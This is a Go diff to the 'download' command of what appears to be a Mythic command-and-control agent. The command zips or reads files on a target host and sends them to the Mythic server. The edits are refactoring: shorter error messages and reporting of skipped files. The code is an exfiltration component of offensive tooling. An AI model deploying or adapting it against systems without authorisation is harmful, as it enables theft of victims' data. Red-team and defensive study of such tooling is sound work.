@@ -43,19 +43,19 @@ func (c *DownloadCommand) Execute(task structs.Task) structs.CommandResult {
 	path, compress := parseDownloadArgs(task.Params)
 
 	if path == "" {
-		return errorResult("Error: No file path specified. Usage: download <file_path>")
+		return errorResult("No file path specified. Usage: download <file_path>")
 	}
 
 	// Get absolute path
 	fullPath, err := filepath.Abs(path)
 	if err != nil {
-		return errorf("Error resolving file path: %s", err.Error())
+		return errorf("resolving file path: %s", err.Error())
 	}
 
 	// Check if path exists and whether it's a directory
 	info, err := os.Stat(fullPath)
 	if err != nil {
-		return errorf("Error accessing path: %s", err.Error())
+		return errorf("accessing path: %s", err.Error())
 	}
 
 	if info.IsDir() {
@@ -97,13 +97,13 @@ func parseDownloadArgs(params string) (path string, compress *bool) {
 func downloadFile(task structs.Task, fullPath string) structs.CommandResult {
 	file, err := os.Open(fullPath)
 	if err != nil {
-		return errorf("Error opening file: %s", err.Error())
+		return errorf("opening file: %s", err.Error())
 	}
 	defer file.Close()
 
 	fi, err := file.Stat()
 	if err != nil {
-		return errorf("Error getting file info: %s", err.Error())
+		return errorf("getting file info: %s", err.Error())
 	}
 
 	result, tfResult := sendFileToMythicWithResult(task, file, fi.Name(), fullPath)
@@ -119,8 +119,11 @@ func downloadFileCompressed(task structs.Task, fullPath string, originalSize int
 	// Compress the file to a temp gzip file
 	compResult, err := files.CompressFileGzip(fullPath)
 	if err != nil {
-		// Fall back to uncompressed transfer on compression failure
-		return downloadFile(task, fullPath)
+		result := downloadFile(task, fullPath)
+		if result.Status == "success" {
+			result.Output += "\nNote: compression failed, sent uncompressed"
+		}
+		return result
 	}
 	defer secureRemove(compResult.CompressedPath)
 
@@ -157,7 +160,7 @@ func downloadDirectory(task structs.Task, dirPath string) structs.CommandResult 
 	// Create temp zip file
 	tmpFile, err := os.CreateTemp("", "")
 	if err != nil {
-		return errorf("Error: cannot create temp file (disk full or temp directory not writable)")
+		return errorf("cannot create temp file (disk full or temp directory not writable)")
 	}
 	tmpPath := tmpFile.Name()
 
@@ -165,20 +168,20 @@ func downloadDirectory(task structs.Task, dirPath string) structs.CommandResult 
 	defer secureRemove(tmpPath)
 
 	// Create zip archive of directory
-	fileCount, totalSize, zipErr := zipDirectory(tmpFile, dirPath)
+	fileCount, totalSize, skipped, zipErr := zipDirectory(tmpFile, dirPath)
 	tmpFile.Close()
 	if zipErr != nil {
-		return errorf("Error creating zip archive: %v", zipErr)
+		return errorf("creating zip archive: %v", zipErr)
 	}
 
 	if fileCount == 0 {
-		return errorf("Error: directory %s contains no accessible files", dirPath)
+		return errorf("directory %s contains no accessible files", dirPath)
 	}
 
 	// Open the temp zip for transfer
 	zipFile, err := os.Open(tmpPath)
 	if err != nil {
-		return errorf("Error: cannot open temp zip file for transfer (file may have been cleaned up)")
+		return errorf("cannot open temp zip file for transfer (file may have been cleaned up)")
 	}
 	defer zipFile.Close()
 
@@ -193,24 +196,41 @@ func downloadDirectory(task structs.Task, dirPath string) structs.CommandResult 
 
 	result := sendFileToMythic(task, zipFile, downloadName, dirPath)
 	if result.Status == "success" {
-		result.Output = fmt.Sprintf("Downloaded directory as zip: %s (%d files, %s original, %s compressed)",
+		msg := fmt.Sprintf("Downloaded directory as zip: %s (%d files, %s original, %s compressed)",
 			dirPath, fileCount, formatFileSize(totalSize), formatFileSize(zipSize))
+		if len(skipped) > 0 {
+			msg += fmt.Sprintf("\n%d files skipped:", len(skipped))
+			limit := len(skipped)
+			if limit > 10 {
+				limit = 10
+			}
+			for _, s := range skipped[:limit] {
+				msg += "\n  " + s
+			}
+			if len(skipped) > 10 {
+				msg += fmt.Sprintf("\n  ... and %d more", len(skipped)-10)
+			}
+		}
+		result.Output = msg
 	}
 	return result
 }
 
 // zipDirectory creates a zip archive of a directory, writing to the provided file.
-// Returns file count, total uncompressed size, and any error.
-func zipDirectory(w *os.File, dirPath string) (int, int64, error) {
+// Returns file count, total uncompressed size, skipped file descriptions, and any error.
+func zipDirectory(w *os.File, dirPath string) (int, int64, []string, error) {
 	zw := zip.NewWriter(w)
 
 	var fileCount int
 	var totalSize int64
+	var skipped []string
 	const maxDepth = 10
 
 	err := filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, walkErr error) error {
 		if walkErr != nil {
-			return nil // skip inaccessible entries
+			relPath, _ := filepath.Rel(dirPath, path)
+			skipped = append(skipped, fmt.Sprintf("%s (access denied)", relPath))
+			return nil
 		}
 
 		relPath, _ := filepath.Rel(dirPath, path)
@@ -239,11 +259,13 @@ func zipDirectory(w *os.File, dirPath string) (int, int64, error) {
 
 		info, infoErr := d.Info()
 		if infoErr != nil {
+			skipped = append(skipped, fmt.Sprintf("%s (stat failed: %v)", relPath, infoErr))
 			return nil
 		}
 
 		header, headerErr := zip.FileInfoHeader(info)
 		if headerErr != nil {
+			skipped = append(skipped, fmt.Sprintf("%s (header error: %v)", relPath, headerErr))
 			return nil
 		}
 		header.Name = filepath.ToSlash(relPath)
@@ -251,17 +273,20 @@ func zipDirectory(w *os.File, dirPath string) (int, int64, error) {
 
 		writer, createErr := zw.CreateHeader(header)
 		if createErr != nil {
+			skipped = append(skipped, fmt.Sprintf("%s (zip header: %v)", relPath, createErr))
 			return nil
 		}
 
 		file, openErr := os.Open(path)
 		if openErr != nil {
+			skipped = append(skipped, fmt.Sprintf("%s (open failed: %v)", relPath, openErr))
 			return nil
 		}
 		defer file.Close()
 
 		written, copyErr := io.Copy(writer, file)
 		if copyErr != nil {
+			skipped = append(skipped, fmt.Sprintf("%s (read error: %v)", relPath, copyErr))
 			return nil
 		}
 
@@ -272,14 +297,14 @@ func zipDirectory(w *os.File, dirPath string) (int, int64, error) {
 
 	if err != nil {
 		zw.Close()
-		return fileCount, totalSize, err
+		return fileCount, totalSize, skipped, err
 	}
 
 	if err := zw.Close(); err != nil {
-		return fileCount, totalSize, fmt.Errorf("finalizing zip: %w", err)
+		return fileCount, totalSize, skipped, fmt.Errorf("finalizing zip: %w", err)
 	}
 
-	return fileCount, totalSize, nil
+	return fileCount, totalSize, skipped, nil
 }
 
 // sendFileToMythic sends a file to Mythic via the chunked transfer channel (backward-compat wrapper)
